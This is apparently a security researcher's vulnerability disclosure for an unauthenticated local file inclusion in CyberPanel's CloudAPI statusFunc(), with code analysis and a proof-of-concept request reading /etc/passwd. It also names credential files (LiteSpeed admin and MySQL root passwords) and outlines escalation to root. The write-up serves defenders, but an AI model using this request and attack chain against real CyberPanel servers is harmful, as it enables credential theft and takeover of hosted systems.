---
title:  "[2] CyberPanel - Authentication Bypass and Local File Inclusion (LFI) in CloudAPI"
layout: post
author: Altion
date:   2024-01-22
# last_modified_at: 2024-01-22
permalink: /posts/cyberpanel-2
categories: cyberpanel, security research
---

In CyberPanel versions between 1.8.7 and 2.3.4, the CloudAPI `statusFunc()` function is not protected by an authentication mechanism, and is susceptible to a Local File Inclusion (LFI) vulnerability.

<table>
    <tr>
        <th>OWASP Top 10</th>
        <td>
            <a href="https://owasp.org/Top10/A03_2021-Injection/" target="blank">A03:2021</a> - Injection
            <br />
            <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="blank">A07:2021</a> - Identification and Authentication Failures
        </td>
    </tr>
    <tr>
        <th>CWE ID</th>
        <td>
            <a href="https://cwe.mitre.org/data/definitions/73.html" target="blank">CWE-73</a> - External Control of File Name or Path
            <br />
            <a href="https://cwe.mitre.org/data/definitions/287.html" target="blank">CWE-287</a> - Improper Authentication
        </td>
    </tr>
    <tr>
        <th>CVSS v4.0 Score</th>
        <td><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:L/SC:H/SI:L/SA:L" target="blank">Critical (9.1)</a></td>
    </tr>
    <tr>
        <th>Vendor URLs</th>
        <td>
            <a href="https://cyberpanel.net/" target="blank">https://cyberpanel.net/</a>
            <br />
            <a href="https://github.com/usmannasir/cyberpanel" target="blank">https://github.com/usmannasir/cyberpanel</a>
        </td>
    </tr>    
    <tr>
        <th>Affected Versions</th>
        <td>1.8.7 - 2.3.4</td>
    </tr>
</table>

Unauthenticated adversaries can exploit this vulnerability to read the last line of arbitrary files on the CyberPanel's underlying host system. This attack is limited to files accessible and readable by the `cyberpanel` user. For files where there the last line contains a comma (`,`) this attack will not be able to retrieve the contents of the complete line.cl

Attackers can also use known CyberPanel files to retrieve sensitive data such as passwords. For example, an unauthenticated attacker can request the `/usr/local/lsws/adminpasswd` and retrieve the LiteSpeed WebAdmin Console password generated during the CyberPanel installation. If this password has remained unchanged, attackers could leverage it to gain administrative access to the LiteSpeed WebAdmin Console located on port `7080` of the CyberPanel instance. 

Additionally, attackers can retrieve the root password of the MySQL database by requesting the '/etc/cyberpanel/mysqlPassword' file. In combination with the existing PHPMyAdmin SignIn functionality (`https://cyberpanel:8090/phpmyadmin/phpmyadminsignin.php?username=root&password={PASSWORD}`), the password can be used to gain root access to the underlying CyberPanel database. Using the root access, adversaries can create, read, update, and delete any records from the MySQL database. Specifically, attackers can also create or modify existing administrative CyberPanel users. Accessing CyberPanel with administrative privileges can allow an attacker to gain unrestricted access to the hosted websites and also use the WebTerminal functionality to gain root access on the underlying CyberPanel host system.

Adversaries can also delete arbitrary files by targeting files containing the `[200]` string since files matching this criteria are subsequently removed. This could potentially result in denial-of-service (DoS) if the removed files are critical to the operation of CyberPanel instance.

#### Technical Analysis

Administrators can extend the CyberPanel features by installing the CloudLinux OS. CloudLinux isolates each customer into a separate Lightweight Virtualized Environment (LVE), which allocates and limits server resources, like memory, CPU and the number of simultaneous connections, for each web hosting tenant.

To accomodate integration with CloudLinux, CyberPanel exposes supporting functionality through the `/cloudAPI/` endpoint. Access to this API is protected by HTTP Basic Authentication and is limited only to the `admin` user. This is the default administrative user created by CyberPanel and should have its API access enabled in order to interact with CloudAPI.


The `/cloudAPI/` endpoint accepts HTTP POST requests in the following format:

```http
POST /cloudAPI/ HTTP/1.1
Host: cyberpanel:8090
Content-Length: 97
Content-Type: application/json;charset=UTF-8
Connection: close

{
    "controller": "statusFunc",
    [...]
}
```

Each HTTP POST request contains the `controller` attribute value indicating which controller function should handle the incoming request. Additional JSON attributes are also used to pass parameter values to the controller function. In the list of registered Cloud API functions, `statusFunc()` seems to be used to track the installation progress of CloudLinux packages.

The `/cloudAPI/` endpoint handles HTTP calls through the the 'router()' view function (line 5):

```python
# File: cloudAPI/urls.py
...
4: urlpatterns = [
5:     url(r'^$', views.router, name='router'),
6:     url(r'^access$', views.access, name='access'),
7: ]
```

The `router()` function acts as a controller for the `/cloudAPI/` endpoint. It ensures that the `/cloudAPI/` can only be used by the `admin` user with enabled API access (lines 21,24).

If the access conditions are met, the JSON `controller` parameter in the HTTP POST request will determine which function is called (line 13). In this case, the `stateFunc()` function will be called if the `stateFunc` controller is requested (lines 199-200):

```python
# File: cloudAPI/views.py
...
09: @csrf_exempt
10: def router(request):
11:     try:
12:         data = json.loads(request.body)
13:         controller = data['controller']
14: 
15:         serverUserName = data['serverUserName']
16: 
17:         admin = Administrator.objects.get(userName=serverUserName)
18: 
19:         cm = CloudManager(data, admin)
20: 
21:         if serverUserName != 'admin':
22:             return cm.ajaxPre(0, 'Only administrator can access API.')
23: 
24:         if admin.api == 0:
25:             return cm.ajaxPre(0, 'API Access Disabled.')
26:
27:         if controller == 'statusFunc':
28:             pass
29:         else:
30:             if cm.verifyLogin(request)[0] == 1:
31:                 pass
32:             else:
33:                 return cm.verifyLogin(request)[1]
...
199:         elif controller == 'statusFunc':
200:             return cm.statusFunc()
...
```

Implemented in `cloudManager.py`, the `statusFunc()` function reads the installation progress from the last line of a file indicated by the JSON `statusFile` parameter (lines 346-349).

If the last line of the file contains `[200]` (line 350), the status file is removed (line 351). The installation progress is marked as complete (line 353), and the last line contents of the file are returned in the HTTP response (line 355).

Similarly, if the last line contains `[400]` (line 356), the installation is marked unsuccessful (line 357) and the last line contents of the file are returned in the HTTP response (line 359):

```python
# File: cloudAPI/cloudManager.py
...
344:     def statusFunc(self):
345:         try:
346:             statusFile = self.data['statusFile']
347:             statusData = open(statusFile, 'r').readlines()
348:             try:
349:                 lastLine = statusData[-1]
350:                 if lastLine.find('[200]') > -1:
351:                     command = 'rm -f ' + statusFile
352:                     ProcessUtilities.executioner(command)
353:                     data_ret = {'status': 1, 'abort': 1, 'installationProgress': "100", 'currentStatus': lastLine}
354:                     json_data = json.dumps(data_ret)
355:                     return HttpResponse(json_data)
356:                 elif lastLine.find('[404]') > -1:
357:                     data_ret = {'status': 0, 'abort': 1, 'installationProgress': "0", 'error_message': lastLine}
358:                     json_data = json.dumps(data_ret)
359:                     return HttpResponse(json_data)
360:                 else:
361:                     progress = lastLine.split(',')
362:                     currentStatus = progress[0]
363:                     try:
364:                         installationProgress = progress[1].rstrip('\n')
365:                     except:
366:                         installationProgress = 0
367:                     data_ret = {'status': 1, 'abort': 0, 'installationProgress': installationProgress,
368:                                 'currentStatus': currentStatus}
369:                     json_data = json.dumps(data_ret)
370:                     return HttpResponse(json_data)
...
```

Otherwise, if neither `[200]` or `[400]` is present, the last line is split (lines 361-364) and returned in the HTTP response (lines 368-370).

The file read operation (line 346-347) receives user-controlled input for the file path and is susceptible to local file inclusion (LFI). In addition, calls to the `statusFunc()` controller function are exempt from authentication.

As proof of concept, the following unauthenticated HTTP POST request attempts to read the `/etc/passwd` file from the underlying host system:

```http
POST /cloudAPI/ HTTP/1.1
Host: cyberpanel:8090
Content-Length: 97
Content-Type: application/json;charset=UTF-8
Connection: close

{
    "controller": "statusFunc",
    "statusFile": "/etc/passwd",
	"serverUserName":"admin"
}
```

As a result, due to the split operation only partial contents of the last line of the `/etc/passwd` file is returned in the HTTP response via the JSON `currentStatus` property:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: LiteSpeed
Connection: close
[...]

{
    "status": 1,
    "abort": 0,
    "installationProgress": "",
    "currentStatus": "testl3379:x:1003:1003:"
}
```

#### Further Reading

Yoohoo! You survived this, because there's more: [Authentication Bypass in File Manager's Upload Functionality](/weblog{% post_url 2024-01-22-cyberpanel-3 %})